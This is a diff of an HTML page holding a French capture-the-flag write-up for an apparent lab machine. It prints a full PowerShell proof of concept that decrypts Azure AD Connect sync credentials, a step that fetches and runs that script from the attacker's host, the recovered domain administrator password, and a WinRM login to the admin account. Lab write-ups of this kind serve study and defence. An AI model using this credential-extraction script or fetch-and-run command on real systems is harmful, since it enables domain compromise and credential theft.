 <p>N&rsquo;ayant que très peu connaissance de ces thématiques, j&rsquo;ai commencé par me documenter sur ce qui existait et ce que l&rsquo;on pouvait faire. Je suis notamment tombé sur la superbe présentation de <a href="https://twitter.com/_dirkjan">@_dirkjan</a> (<a href="https://www.youtube.com/watch?v=JEIR5oGCwdg">lien</a>).</p>
-
 <p>On y apprend notamment qu&rsquo;il est possible d&rsquo;extraire des identifiants d&rsquo;une machine connectée à un domaine Azure via Azure AD Connect.</p>
-
-<p>Quelques recherches supplémentaires nous redirigent vers 2 ressources intéressantes :
-- <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a>
-- <a href="https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a></p>
-
+<p>Quelques recherches supplémentaires nous redirigent vers 2 ressources intéressantes :</p>
+<ul>
+<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></li>
+<li><a href="https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a></li>
+</ul>
 <p>On peut notamment récupérer un script Powershell qui semble effectuer pour nous l&rsquo;extraction (merci à @<em>xpn</em> pour ça!).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Write-Host <span style="color:#e6db74">&#34;AD Connect Sync Credential Extract POC (@_xpn_)`n&#34;</span>
 
-<pre><code class="language-bash">Write-Host &quot;AD Connect Sync Credential Extract POC (@_xpn_)`n&quot;
+$client <span style="color:#f92672">=</span> new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span>
+$client.Open<span style="color:#f92672">()</span>
+$cmd <span style="color:#f92672">=</span> $client.CreateCommand<span style="color:#f92672">()</span>
+$cmd.CommandText <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&#34;</span>
+$reader <span style="color:#f92672">=</span> $cmd.ExecuteReader<span style="color:#f92672">()</span>
+$reader.Read<span style="color:#f92672">()</span> | Out-Null
+$key_id <span style="color:#f92672">=</span> $reader.GetInt32<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
+$instance_id <span style="color:#f92672">=</span> $reader.GetGuid<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+$entropy <span style="color:#f92672">=</span> $reader.GetGuid<span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
+$reader.Close<span style="color:#f92672">()</span>
 
-$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;
-$client.Open()
-$cmd = $client.CreateCommand()
-$cmd.CommandText = &quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;
-$reader = $cmd.ExecuteReader()
-$reader.Read() | Out-Null
-$key_id = $reader.GetInt32(0)
-$instance_id = $reader.GetGuid(1)
-$entropy = $reader.GetGuid(2)
-$reader.Close()
+$cmd <span style="color:#f92672">=</span> $client.CreateCommand<span style="color:#f92672">()</span>
+$cmd.CommandText <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;</span>
+$reader <span style="color:#f92672">=</span> $cmd.ExecuteReader<span style="color:#f92672">()</span>
+$reader.Read<span style="color:#f92672">()</span> | Out-Null
+$config <span style="color:#f92672">=</span> $reader.GetString<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
+$crypted <span style="color:#f92672">=</span> $reader.GetString<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+$reader.Close<span style="color:#f92672">()</span>
 
-$cmd = $client.CreateCommand()
-$cmd.CommandText = &quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'&quot;
-$reader = $cmd.ExecuteReader()
-$reader.Read() | Out-Null
-$config = $reader.GetString(0)
-$crypted = $reader.GetString(1)
-$reader.Close()
-
-add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
-$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
-$km.LoadKeySet($entropy, $instance_id, $key_id)
-$key = $null
-$km.GetActiveCredentialKey([ref]$key)
-$key2 = $null
-$km.GetKey(1, [ref]$key2)
-$decrypted = $null
-$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
-$domain = select-xml -Content $config -XPath &quot;//parameter[@name='forest-login-domain']&quot; | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
-$username = select-xml -Content $config -XPath &quot;//parameter[@name='forest-login-user']&quot; | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
-$password = select-xml -Content $decrypted -XPath &quot;//attribute&quot; | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
-Write-Host (&quot;Domain: &quot; + $domain.Domain)
-Write-Host (&quot;Username: &quot; + $username.Username)
-Write-Host (&quot;Password: &quot; + $password.Password)
-</code></pre>
-
-<p>Cependant, l&rsquo;exploit n&rsquo;est pas fonctionnel en l&rsquo;état. En effet, il existe deux moyens d&rsquo;extraire ces identifiants :
-- Par l&rsquo;intermédiaire d&rsquo;une base de données SQLExpress par défaut
-- Par l&rsquo;intermédiaire d&rsquo;une instance MSSQL</p>
-
+add-type -path <span style="color:#e6db74">&#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;</span>
+$km <span style="color:#f92672">=</span> New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet<span style="color:#f92672">(</span>$entropy, $instance_id, $key_id<span style="color:#f92672">)</span>
+$key <span style="color:#f92672">=</span> $null
+$km.GetActiveCredentialKey<span style="color:#f92672">([</span>ref<span style="color:#f92672">]</span>$key<span style="color:#f92672">)</span>
+$key2 <span style="color:#f92672">=</span> $null
+$km.GetKey<span style="color:#f92672">(</span>1, <span style="color:#f92672">[</span>ref<span style="color:#f92672">]</span>$key2<span style="color:#f92672">)</span>
+$decrypted <span style="color:#f92672">=</span> $null
+$key2.DecryptBase64ToString<span style="color:#f92672">(</span>$crypted, <span style="color:#f92672">[</span>ref<span style="color:#f92672">]</span>$decrypted<span style="color:#f92672">)</span>
+$domain <span style="color:#f92672">=</span> <span style="color:#66d9ef">select</span>-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | <span style="color:#66d9ef">select</span> @<span style="color:#f92672">{</span>Name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Domain&#39;</span>; Expression <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>$_.node.InnerXML<span style="color:#f92672">}}</span>
+$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">select</span>-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | <span style="color:#66d9ef">select</span> @<span style="color:#f92672">{</span>Name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Username&#39;</span>; Expression <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>$_.node.InnerXML<span style="color:#f92672">}}</span>
+$password <span style="color:#f92672">=</span> <span style="color:#66d9ef">select</span>-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | <span style="color:#66d9ef">select</span> @<span style="color:#f92672">{</span>Name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Password&#39;</span>; Expression <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>$_.node.InnerXML<span style="color:#f92672">}}</span>
+Write-Host <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Domain: &#34;</span> + $domain.Domain<span style="color:#f92672">)</span>
+Write-Host <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Username: &#34;</span> + $username.Username<span style="color:#f92672">)</span>
+Write-Host <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Password: &#34;</span> + $password.Password<span style="color:#f92672">)</span>
+</code></pre></div><p>Cependant, l&rsquo;exploit n&rsquo;est pas fonctionnel en l&rsquo;état. En effet, il existe deux moyens d&rsquo;extraire ces identifiants :</p>
+<ul>
+<li>Par l&rsquo;intermédiaire d&rsquo;une base de données SQLExpress par défaut</li>
+<li>Par l&rsquo;intermédiaire d&rsquo;une instance MSSQL</li>
+</ul>
 <p>Ainsi, le type d&rsquo;authentification utilisée par le script sera à modifier selon le type de base à laquelle on souhaite se connecter.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Instance MSSQL</span>
+<span style="color:#e6db74">&#34;Server=LocalHost;Database=ADSync;Trusted_Connection=True;&#34;</span>
 
-<pre><code class="language-bash"># Instance MSSQL
-&quot;Server=LocalHost;Database=ADSync;Trusted_Connection=True;&quot;
+<span style="color:#75715e"># Instance SQLExpress</span>
+<span style="color:#e6db74">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span>
+</code></pre></div><p>Dans le cas de cette machine, une instance MSSQL est utilisée. Ainsi, il est nécessaire de modifier la ligne suivante du script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$client <span style="color:#f92672">=</span> new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Server=LocalHost;Database=ADSync;Trusted_Connection=True;&#34;</span>
+$client.Open<span style="color:#f92672">()</span>
+</code></pre></div><p>Une fois fait, on met en place un petit serveur Python afin de télécharger le script sur la machine. On télécharge ce dernier et on l&rsquo;exécute directement via notre shell WinRM.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell.rb                                                          
+PS &gt; Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://10.10.14.32:8000/test.ps1&#34;</span> -OutFile <span style="color:#e6db74">&#34;test.ps1&#34;</span>
+PS &gt; .<span style="color:#ae81ff">\t</span>est.ps1
+AD Connect Sync Credential Extract POC <span style="color:#f92672">(</span>@_xpn_<span style="color:#f92672">)</span>
 
-# Instance SQLExpress
-&quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;
-</code></pre>
+Stage <span style="color:#ae81ff">1</span> - OK
 
-<p>Dans le cas de cette machine, une instance MSSQL est utilisée. Ainsi, il est nécessaire de modifier la ligne suivante du script.</p>
-
-<pre><code class="language-bash">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Server=LocalHost;Database=ADSync;Trusted_Connection=True;&quot;
-$client.Open()
-</code></pre>
-
-<p>Une fois fait, on met en place un petit serveur Python afin de télécharger le script sur la machine. On télécharge ce dernier et on l&rsquo;exécute directement via notre shell WinRM.</p>
-
-<pre><code class="language-bash">$ ruby winrm_shell.rb                                                          
-PS &gt; Invoke-WebRequest -Uri &quot;http://10.10.14.32:8000/test.ps1&quot; -OutFile &quot;test.ps1&quot;
-PS &gt; .\test.ps1
-AD Connect Sync Credential Extract POC (@_xpn_)
-
-Stage 1 - OK
-
-Stage 2 - OK
+Stage <span style="color:#ae81ff">2</span> - OK
 
 Domain: MEGABANK.LOCAL
 Username: administrator
 Password: d0m@in4dminyeah!
-</code></pre>
-
-<p>Tadaaaam ! On adapte notre script ruby (WinRM) et on file chercher le flag root !</p>
-
-<pre><code class="language-bash">conn = WinRM::Connection.new( 
-  endpoint: 'http://10.10.10.172:5985/wsman',
-  user: 'MEGABANK\administrator',
-  password: 'd0m@in4dminyeah!',
-)
-</code></pre>
-
-<pre><code class="language-bash">$ ruby winrm_shell_admin.rb
+</code></pre></div><p>Tadaaaam ! On adapte notre script ruby (WinRM) et on file chercher le flag root !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">conn <span style="color:#f92672">=</span> WinRM::Connection.new<span style="color:#f92672">(</span> 
+  endpoint: <span style="color:#e6db74">&#39;http://10.10.10.172:5985/wsman&#39;</span>,
+  user: <span style="color:#e6db74">&#39;MEGABANK\administrator&#39;</span>,
+  password: <span style="color:#e6db74">&#39;d0m@in4dminyeah!&#39;</span>,
+<span style="color:#f92672">)</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_admin.rb
 PS &gt; whoami
-megabank\administrator
+megabank<span style="color:#ae81ff">\a</span>dministrator
 PS &gt; pwd
 
 Path                            
 ----                            
-C:\Users\Administrator\Documents
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments
 
 
 PS &gt; ls ../Desktop/
 
-    Directory: C:\Users\Administrator\Desktop
+    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
 
 Mode                LastWriteTime         Length Name       
 ----                -------------         ------ ----
--ar---         1/3/2020   5:48 AM             32 root.txt
-</code></pre>
-
-<p>w00ted !</p>
+-ar---         1/3/2020   5:48 AM             <span style="color:#ae81ff">32</span> root.txt
+</code></pre></div><p>w00ted !</p>
   </div>
   
 
@@ -564,7 +528,7 @@ Mode                LastWriteTime         Length Name
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
